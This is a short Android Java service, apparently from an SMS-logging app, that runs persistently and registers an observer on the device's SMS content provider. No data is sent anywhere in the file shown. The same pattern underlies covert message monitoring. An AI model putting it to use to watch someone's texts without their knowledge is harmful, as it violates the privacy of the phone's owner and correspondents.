package com.example.captainslog;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

public class SMSSendService extends Service {

    @Override
    public void onCreate() {
        Log.i("SMSCL:onCreate","SMSCL:onCreate");
        SMSObserver content = new SMSObserver(new Handler(), this);
        // REGISTER ContetObserver
        this.getContentResolver().
                registerContentObserver(Uri.parse("content://sms/"), true, content);
    }

    @Override
    public void onDestroy() {
        Log.i("SMSCL:onDestroy","SMSCL:onDestroy");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startid) {
        Log.i("SMSCL:onStartCommand","SMSCL:onStartCommand");
        return Service.START_STICKY;
    }

    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        Log.i("SMSCL:BindCalled","SMSCL:BindCalled");
        return null;
    }
}